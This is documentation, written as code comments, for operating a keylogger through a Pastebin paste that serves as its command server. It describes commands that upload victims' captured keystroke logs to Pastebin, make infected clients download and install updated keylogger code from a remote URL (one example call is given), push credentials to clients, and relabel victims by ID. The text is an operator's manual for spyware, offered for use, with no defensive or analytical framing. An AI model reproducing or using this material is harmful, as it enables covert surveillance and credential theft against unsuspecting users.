# [DOCS]
# Add the uncommented lines to an unlisted Pastebin paste to create a Keylogger Metadata Server.
# Additionally, add the below functions if needed to remotely control the client:

# send()
#   - Sends logs (this is automatically done on startup)
#   - Logs are sent with the status of privacyLvl (by default this is set to '1' or unlisted).

# send_text(title,text)
#   - Sends text to Pastebin.
#   - Text is ALWAYS sent with the 'private' status.

# update()
#   - Fetches the latest keylogger from the HARDCODED update server. This command updates all clients.

# upd(ids, url)
#   - USE THIS INSTEAD if you want to use a different update server and/or only want to update specific clients.
#   - Use upd(["id1","id2","etc"],update_server) to update specific clients and use the hardcoded update server.
#   - Use upd(["*"],"https://pastebin.com/raw/UpdateServerURL") to force all clients to use a specific update server.

# changeid(before, after)
#   - Changes ID from [before] to [after]. Useful to distinguish your clients.

# loadcreds(ids, url)
#   - Forces the listed IDs to load credentials stored at [url].
#   - Credentials MUST be compressed using zlib.compress(). NEVER store credentials in plain text!!!

# Use ["*"] as the 'ids' parameter in any function/list to refer to ALL clients connected to the KMS.
# Put each ID in only one list.
